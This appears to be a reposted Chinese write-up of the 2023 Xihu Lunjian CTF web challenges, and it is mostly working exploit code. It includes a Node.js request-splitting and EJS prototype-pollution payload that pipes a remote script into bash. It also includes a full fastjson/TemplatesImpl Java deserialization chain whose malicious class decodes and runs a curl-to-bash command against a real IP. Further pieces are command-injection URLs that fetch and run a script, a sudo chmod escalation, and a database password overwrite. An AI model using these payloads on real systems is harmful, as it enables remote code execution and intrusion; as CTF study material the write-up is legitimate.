# 2023西湖论剑web-writeup题解wp

> 原文: https://www.ctfiot.com/95359.html
> ID: 95359

web

扭转乾坤

大小写绕过

Node Magical Login

伪造cookie获得第一个flag

让它这里异常报错就可以了

这里对列表进行tolowercase处理就能触发异常

DASCTF{25983378830391925743269111888482}

unusual php

读index.php发现乱码。是改了engine

通过php.ini和phpinfo找到 zend_test.so的位置

然后读取出来保存为文件

然后逆向得知rc4和密钥

用cyber rc4可以解密index.php。这里先对这个乱码base64，这样不容易漏字节

rc4加密一句话，防止复制漏字节，先生产base64的，再解码上传

弹shell 

看到/etc/sudoer.bak

sudo可以使用chmod 

sudo chmod 777 /flag

题目靶机被搞了，复现不了拿flag的截图

real_ez_node

直接NodeJS 中 Unicode 字符损坏导致的 HTTP 拆分攻击。然后原型链污染打ejs就行了。constructor.prototype.outputFunctionName绕过那个__proto__

payload = ''' HTTP/1.1

POST /copy HTTP/1.1
Host: 127.0.0.1:
3000
Connection: close
Content-Type: application/json
Content-Length: 152

{"constructor.prototype.outputFunctionName":"x;global.process.mainModule.require('child_process').exec('curl http://xxx.xxx.xxx.xxx/bash.txt|bash');var x"}

GET / HTTP/1.1
test:'''.replace("n","rn")

def payload_encode(raw):
    ret = u""
    for i in raw:
        ret += chr(0x0100+ord(i))
    return ret

payload = payload_encode(payload)
print(payload)

easy_api

https://blog.csdn.net/z69183787/article/details/84848751

直接用//绕过filter

接下来就是反序列化 

利用xstring来触发fastjson的tostring，然后就能触发任意类的get方法，再塞一个templatesimpl的对象就可以正常反序列化这个恶意的templatesimpl了

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;

public class exp {
    public static Field getField(final Class<?> clazz, final String fieldName) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if (field != null)
                field.setAccessible(true);
            else if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        } catch (NoSuchFieldException e) {
            if (!clazz.getSuperclass().equals(Object.class)) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    //反射设置属性值
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static void main(String[] args) {
        try {
            TemplatesImpl templates = new TemplatesImpl();
            byte[] bytess = Files.readAllBytes(Paths.get("C:\Users\Administrator\Desktop\西湖论剑\debug\target\classes\test.class"));
            setFieldValue(templates, "_bytecodes", new byte[][]{bytess});
            setFieldValue(templates, "_transletIndex", 0);
            setFieldValue(templates, "_name", "Pwnr");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

            ArrayList arrayList = new ArrayList();
            arrayList.add(templates);
            JSONArray toStringBean = new JSONArray(arrayList);
            //反序列化时HotSwappableTargetSource.equals会被调用，触发Xstring.equals
            HotSwappableTargetSource v1 = new HotSwappableTargetSource(toStringBean);
            HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("xxx"));

            HashMap<Object, Object> s = new HashMap<>();
            setFieldValue(s, "size", 2);
            Class<?> nodeC;
            try {
                nodeC = Class.forName("java.util.HashMap$Node");
            } catch (ClassNotFoundException e) {
                nodeC = Class.forName("java.util.HashMap$Entry");
            }
            Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
            nodeCons.setAccessible(true);

            Object tbl = Array.newInstance(nodeC, 2);
            Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
            Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
                      setFieldValue(s, "table", tbl);

                      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                      ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
                      objectOutputStream.writeObject(s);

                      byte[] bytes = byteArrayOutputStream.toByteArray();
                      String s1 = Base64.getEncoder().encodeToString(bytes);
                      System.out.println(s1);
                      ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
                      CustomObjectInputStream ois = new CustomObjectInputStream(bais);
                      ois.readObject();
                      ois.close();
                      } catch (Exception e) {
                      e.printStackTrace();
                      }
                      }
                      }

恶意类

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;
import java.io.Serializable;

public class test extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet{
    static {

        try {
            Runtime.getRuntime().exec("bash -c {echo,Y3VybCBodHRwOi8vNDcuOTYuNDEuMTAzL2Jhc2gudHh0fGJhc2g=}|{base64,-d}|{bash,-i}");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

real world git

可以注册用户。然后创建仓库。拿到rkey

rkey和u_key会进行权限检测。但是由于是我们自己账号创建的仓库。所以必定有权限。跟进getBlameInfo

简单来说就是第一个不可控。第二个Command:
run可控。然后Command:
wrapArgument会过滤所有空格符号。暂时没绕。

跟进Run方法。发现将数组里的参数都implode起来。加上了空格。就可以构造参数1 参数2绕过空格的过滤

exp

/api/repository/blameInfo?repository=rkey&revision=;`curl&path=xxxx>/tmp/b
/api/repository/blameInfo?repository=rkey&revision=;`sh&path=/tmp/b

然后修改mysql user表的密码进入后台 flag在后台

mysql -uroot -proot -e 'use codefever_community;update cc_users set u_password="25e4826df708c36b367cc3eb32130820"'


```
payload = ''' HTTP/1.1

POST /copy HTTP/1.1
Host: 127.0.0.1:
3000
Connection: close
Content-Type: application/json
Content-Length: 152

{"constructor.prototype.outputFunctionName":"x;global.process.mainModule.require('child_process').exec('curl http://xxx.xxx.xxx.xxx/bash.txt|bash');var x"}

GET / HTTP/1.1
test:'''.replace("n","rn")

def payload_encode(raw):
    ret = u""
    for i in raw:
        ret += chr(0x0100+ord(i))
    return ret

payload = payload_encode(payload)
print(payload)
import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;

public class exp {
    public static Field getField(final Class<?> clazz, final String fieldName) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if (field != null)
                field.setAccessible(true);
            else if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        } catch (NoSuchFieldException e) {
            if (!clazz.getSuperclass().equals(Object.class)) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    //反射设置属性值
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static void main(String[] args) {
        try {
            TemplatesImpl templates = new TemplatesImpl();
            byte[] bytess = Files.readAllBytes(Paths.get("C:\Users\Administrator\Desktop\西湖论剑\debug\target\classes\test.class"));
            setFieldValue(templates, "_bytecodes", new byte[][]{bytess});
            setFieldValue(templates, "_transletIndex", 0);
            setFieldValue(templates, "_name", "Pwnr");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

            ArrayList arrayList = new ArrayList();
            arrayList.add(templates);
            JSONArray toStringBean = new JSONArray(arrayList);
            //反序列化时HotSwappableTargetSource.equals会被调用，触发Xstring.equals
            HotSwappableTargetSource v1 = new HotSwappableTargetSource(toStringBean);
            HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("xxx"));

            HashMap<Object, Object> s = new HashMap<>();
            setFieldValue(s, "size", 2);
            Class<?> nodeC;
            try {
                nodeC = Class.forName("java.util.HashMap$Node");
            } catch (ClassNotFoundException e) {
                nodeC = Class.forName("java.util.HashMap$Entry");
            }
            Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
            nodeCons.setAccessible(true);

            Object tbl = Array.newInstance(nodeC, 2);
            Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
            Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
                      setFieldValue(s, "table", tbl);

                      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                      ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
                      objectOutputStream.writeObject(s);

                      byte[] bytes = byteArrayOutputStream.toByteArray();
                      String s1 = Base64.getEncoder().encodeToString(bytes);
                      System.out.println(s1);
                      ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
                      CustomObjectInputStream ois = new CustomObjectInputStream(bais);
                      ois.readObject();
                      ois.close();
                      } catch (Exception e) {
                      e.printStackTrace();
                      }
                      }
                      }
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;
import java.io.Serializable;

public class test extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet{
    static {

        try {
            Runtime.getRuntime().exec("bash -c {echo,Y3VybCBodHRwOi8vNDcuOTYuNDEuMTAzL2Jhc2gudHh0fGJhc2g=}|{base64,-d}|{bash,-i}");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
/api/repository/blameInfo?repository=rkey&revision=;`curl&path=xxxx>/tmp/b
/api/repository/blameInfo?repository=rkey&revision=;`sh&path=/tmp/b
mysql -uroot -proot -e 'use codefever_community;update cc_users set u_password="25e4826df708c36b367cc3eb32130820"'
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/10-1675419520.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/6-1675419521.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/2-1675419521.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/4-1675419522.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/5-1675419523.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/9-1675419523.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/2-1675419524.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/4-1675419524.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/7-1675419525.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/02/10-1675419526.png)